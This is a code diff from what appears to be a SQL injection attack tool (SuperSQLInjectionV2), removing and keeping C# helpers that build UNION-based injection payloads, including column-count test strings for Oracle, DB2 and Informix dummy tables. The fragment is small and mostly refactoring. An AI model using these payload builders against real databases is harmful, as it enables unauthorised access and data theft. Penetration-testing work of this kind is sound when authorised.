@@ -139,19 +139,6 @@ namespace SuperSQLInjectionV2.Payload
         }
 
 
-
-        public static string UnionColumns(List<string> columns, string unionStr)
-        {
-            StringBuilder sb = new StringBuilder();
-            foreach (string column in columns)
-            {
-                sb.Append(column + unionStr);
-            }
-            sb.Remove(sb.Length - unionStr.Length, unionStr.Length);
-            return sb.ToString();
-        }
-
-
         public static string UnionColumnCountTest(int maxColumn, string fill)
         {
             StringBuilder sb = new StringBuilder(" 1=2 union all select ");
@@ -178,22 +165,6 @@ namespace SuperSQLInjectionV2.Payload
         {
 
             return UnionColumnCountTest(maxColumn, testIndex, fill) + " from dual";
-        }
-
-        public static string UnionColumnCountTestByDB2(string unionTempaldate, string fill)
-        {
-            StringBuilder sb = new StringBuilder(" 1=2 union all select ");
-            sb.Append(unionTempaldate.Replace("{data}", fill, StringComparison.Ordinal));
-            sb.Append(" from sysibm.sysdummy1");
-            return sb.ToString();
-        }
-
-        public static string UnionColumnCountTestByInformix(string unionTempaldate, string fill)
-        {
-            StringBuilder sb = new StringBuilder(" 1=2 union all select ");
-            sb.Append(unionTempaldate.Replace("{data}", fill, StringComparison.Ordinal));
-            sb.Append(" from sysmaster:sysdual");
-            return sb.ToString();
         }
 
 
